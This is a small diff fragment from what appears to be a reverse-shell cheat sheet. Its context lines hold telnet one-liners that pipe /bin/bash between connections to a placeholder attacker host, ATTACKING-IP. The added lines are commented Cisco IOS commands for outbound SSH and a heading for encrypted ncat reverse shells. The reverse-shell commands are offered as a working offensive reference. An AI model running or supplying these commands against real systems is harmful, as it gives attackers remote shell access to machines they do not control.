@@ -76,6 +76,17 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 
 telnet ATTACKING-IP 80 | /bin/bash | telnet
 
+#Cisco IOS Enabled SSH outbound
+#enable
+#configure terminal
+#line (line-number ending-line-number)
+#no exec
+#login authentication listname
+#transport input ssh
+#exit
+#exit
+#ssh -l userid : {number} {ip-address}
+
 #encrypted reverse shells
 
 #ncat
